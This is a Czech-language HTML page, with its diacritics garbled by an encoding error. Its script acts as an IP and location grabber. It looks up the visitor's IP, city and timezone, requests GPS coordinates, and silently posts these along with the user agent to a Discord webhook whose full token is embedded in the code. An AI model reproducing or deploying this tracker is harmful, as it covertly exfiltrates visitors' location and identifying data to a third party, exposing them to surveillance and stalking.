<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8" />
  <title>Zji코콘ov치n칤 polohy</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 2rem; }
    pre { background: #f4f4f4; padding: 1rem; border-radius: 5px; display: inline-block; text-align: left; }
  </style>
</head>
<body>
  <h1>Zji코콘ujeme 칰daje...</h1>
  <div id="ipLocation">
    <h2>IP location:</h2>
    <pre>Na캜칤t치m...</pre>
  </div>
  <div id="geoLocation">
    <h2>Geo location:</h2>
    <pre>캛ek치m na povolen칤 GPS...</pre>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1376841162370973716/OWCzBKZ92GkMfw_a0JDDeuYH2hgwRUg7WzKcOCqvnAFfW97IE8B-I6yN8J1fQrrWiZQk";

    let ipInfoData = null;
    let geoCoordsData = null;

    function sendToDiscord() {
      if (!ipInfoData) return;

      const geoText = geoCoordsData
        ? `游늷 GPS sou콏adnice: ${geoCoordsData.latitude}, ${geoCoordsData.longitude}`
        : "游늷 GPS sou콏adnice: nebyly povoleny nebo dostupn칠";

      const message = {
        content: `游닌 **Nov칳 p콏칤stup**
游깴 IP location:
 - IP: ${ipInfoData.ip}
 - St치t: ${ipInfoData.country_name}
 - M캩sto: ${ipInfoData.city}
 - 캛asov칠 p치smo: ${ipInfoData.timezone}

${geoText}

游 User-Agent: ${navigator.userAgent}
游뎹 캛as: ${new Date().toISOString()}`
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(message)
      }).catch(console.error);
    }

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(ipInfo => {
        ipInfoData = ipInfo;
        document.querySelector("#ipLocation pre").innerText =
          `IP: ${ipInfo.ip}\nSt치t: ${ipInfo.country_name}\nM캩sto: ${ipInfo.city}\n캛asov칠 p치smo: ${ipInfo.timezone}`;

        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(position => {
            geoCoordsData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            document.querySelector("#geoLocation pre").innerText =
              `Latitude: ${geoCoordsData.latitude}\nLongitude: ${geoCoordsData.longitude}`;

            sendToDiscord();
          }, error => {
            document.querySelector("#geoLocation pre").innerText =
              "GPS poloha nebyla povolena nebo do코lo k chyb캩: " + error.message;
            sendToDiscord();
          });
        } else {
          document.querySelector("#geoLocation pre").innerText =
            "Geolokace nen칤 podporov치na.";
          sendToDiscord();
        }
      })
      .catch(() => {
        document.querySelector("#ipLocation pre").innerText = "Chyba p콏i na캜칤t치n칤 IP.";
        sendToDiscord();
      });
  </script>
</body>
</html>
